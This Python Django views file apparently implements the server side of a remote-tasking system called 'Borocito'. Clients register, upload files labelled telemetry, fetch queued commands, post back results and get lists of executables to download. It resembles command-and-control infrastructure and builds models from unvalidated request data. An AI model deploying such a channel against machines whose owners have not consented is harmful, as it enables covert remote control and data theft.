from django.http import HttpRequest, HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings

import json
from pathlib import Path
from datetime import datetime

# Create your views here.
from api.utilities import borocito_instance_endpoint
from api.models import Instancia, Telemetria
from configs.models import Component, Configuration

@csrf_exempt
@borocito_instance_endpoint
def report(request: HttpRequest):
    if request.method == "POST":
        cuerpo = dict(json.loads(request.body))
        instancia = Instancia(**cuerpo)
        instancia.save()
        return JsonResponse({"uuid": instancia.uuid}, safe=False, status=201)
    return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)

@csrf_exempt
@borocito_instance_endpoint
def telemetry(request: HttpRequest):
    if request.method == "POST" and request.FILES["file"]:
        archivo = request.FILES["file"]
        telemetria = Telemetria(
            filename=archivo.name,
            extension=Path(archivo.name).suffix,
            size=archivo.size,
            instance=Instancia.objects.get(key=request.headers.get("Key-Pair"))
        )
        telemetria.telemetry.save(archivo.name, archivo)
        return JsonResponse({"uuid": telemetria.uuid}, status=201)
    return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)

@csrf_exempt
@borocito_instance_endpoint
def instance(request: HttpRequest):
    instancia = Instancia.objects.get(key=request.headers.get("Key-Pair"))
    # TODO : controlar class ENUM types (like TELEMETRY for create a file based in raw text content)
    if request.method == "POST":
        instancia.command = None
        instancia.response = request.POST.get('content')
        instancia.save(update_fields=['command', 'response'])
        return HttpResponse(f"OK! {instancia.uuid} whatever you want bra")
    elif request.method == "GET":
        respuesta = f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\r\nCommand1>{instancia.command or ''}\r\nCommand2>\r\nCommand3>\r\n[Response]\r\n"
        instancia.command = None
        instancia.response = None
        instancia.save(update_fields=['command', 'response'])
        return HttpResponse(respuesta)
    return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)

def configuration(request: HttpRequest):
    config = Configuration.objects.values(
        'server_status',
        'fall_back_server',
        'borocitos',
        'boro_get',
    ).last()
    return JsonResponse(config, safe=False)

def repository(request: HttpRequest):
    components = Component.objects.all()
    repos = {}
    for component in components:
        repos.update({component.name: {
            "name": component.name,
            "executable": component.executable,
            "version": component.version,
            "binaries": component.binaries,
        }})
    return JsonResponse(repos, safe=False)
